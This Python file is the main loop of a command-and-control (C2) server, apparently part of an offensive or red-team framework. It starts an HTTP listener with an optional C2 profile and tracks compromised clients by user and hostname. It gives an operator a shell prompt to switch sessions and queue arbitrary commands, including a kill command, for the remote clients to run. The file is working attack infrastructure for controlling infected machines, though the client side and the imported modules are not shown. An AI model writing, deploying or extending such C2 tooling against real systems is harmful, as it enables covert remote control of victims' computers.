from os import mkdir, path
from config import load_config
from c2.crypto.encryption import create_cipher
from c2.server.sessions import SessionManager
from c2.server.handler import C2Handler, ThreadedHTTPServer
from c2.logging.activity_log import ActivityLog
from config.profile_handler import load_profile


def run_server(config_path: str = None):
    config = load_config(config_path)

    storage = config.server.storage_dir
    if not path.isdir(storage):
        mkdir(storage)

    activity_log = None
    if config.logging.enabled:
        activity_log = ActivityLog(config.logging.database)
        activity_log.log_event("server_start", f"port={config.network.port}")

    session_mgr = SessionManager(activity_log=activity_log)

    profile = None
    profile_name = config._data.get("profile")
    if profile_name:
        profile = load_profile(profile_name)
        print(f"Loaded C2 profile: {profile.get('profile', {}).get('name', profile_name)}")

    C2Handler.config = config
    C2Handler.session_mgr = session_mgr
    C2Handler.activity_log = activity_log
    C2Handler.profile = profile
    C2Handler.uri_map = None  # Reset on each start

    server = ThreadedHTTPServer((config.network.bind_address, config.network.port), C2Handler)

    print(f"C2 server listening on {config.network.bind_address or '0.0.0.0'}:{config.network.port}")
    if activity_log:
        print(f"Activity logging to {config.logging.database}")

    try:
        while True:
            account = session_mgr.client_account or "operator"
            hostname = session_mgr.client_hostname or "server"
            prompt = f"{account}@{hostname}:{session_mgr.active_cwd}$ "

            try:
                if config.server.input_timeout:
                    from inputimeout import inputimeout, TimeoutOccurred
                    command = inputimeout(prompt=prompt, timeout=config.server.input_timeout)
                else:
                    command = input(prompt)
            except Exception:
                if config.server.input_timeout and config.server.keep_alive_cmd:
                    command = config.server.keep_alive_cmd
                else:
                    continue

            if command == "sessions":
                for sid, client in session_mgr.sessions.items():
                    marker = " *" if sid == session_mgr.active_session_id else ""
                    print(f"  {sid}: {client}{marker}")
                continue

            if command.startswith("use "):
                try:
                    new_sid = int(command.split()[1])
                    if new_sid in session_mgr.sessions:
                        session_mgr.active_session_id = new_sid
                        parts = session_mgr.sessions[new_sid].split("@")
                        session_mgr.client_account = parts[0] if len(parts) > 0 else ""
                        session_mgr.client_hostname = parts[1] if len(parts) > 1 else ""
                        print(f"Switched to session {new_sid}")
                        if activity_log:
                            activity_log.log_event("session_switch", f"session_id={new_sid}")
                    else:
                        print(f"Session {new_sid} not found")
                except (IndexError, ValueError):
                    print("Usage: use <session_id>")
                continue

            session_mgr.queue_command(command)

            if command.startswith("client kill"):
                session_mgr.client_account = ""
                session_mgr.client_hostname = ""
                session_mgr.active_session_id = 1
    except KeyboardInterrupt:
        print("\nServer shutting down.")
        server.shutdown()
        if activity_log:
            activity_log.log_event("server_stop")
